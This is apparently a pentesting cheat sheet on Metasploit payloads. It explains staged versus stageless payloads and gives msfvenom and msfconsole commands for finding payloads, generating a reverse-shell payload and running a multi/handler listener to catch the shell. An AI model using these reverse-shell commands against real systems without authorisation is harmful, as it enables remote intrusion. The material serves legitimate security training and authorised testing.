## Payloads

Staged vs Stageless payloads
A staged payload is sent in two parts: a small "stager" that connects back, and then the main payload (the "stage") is sent over that connection. A stageless payload is a single, large, self-contained file that has everything needed to run.


### Finding payloads

Via msfconsole:
```bash
search type:payload platform:windows x64 reverse
search type:payload platform:linux reverse_tcp
```

Via msfvenom:
```bash
msfvenom --list payloads
msfvenom --list payloads | grep windows | grep x64 | grep reverse

msfvenom --list formats
msfvenom --list encoders
```
### Generate a payload

```bash
# Reverse shell
msfvenom -p <PAYLOAD> lhost=<IP> lport=<PORT> -f <FORMAT> -b <BAD_CHARS> -o <FILENAME>
```
## Catching your shell
> [!IMPORTANT]
> You must use a multi-handler when catching staged payloads. If you want to use netcat you must use a stageless `linux/x86/shell_reverse_tcp`. Stageless payloads typicall have "shell" in their name.
>
> - windows/shell/reverse_tcp (Staged)
> - windows/shell_reverse_tcp (Stageless)
> - linux/shell/reverse_tcp (Staged)
> - linux/shell_reverse_tcp (Stageless)

## Multi-handler
Setup a multihander to catch a staged callback
```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set lhost <IP>; set lport <PORT>; exploit -j"
```

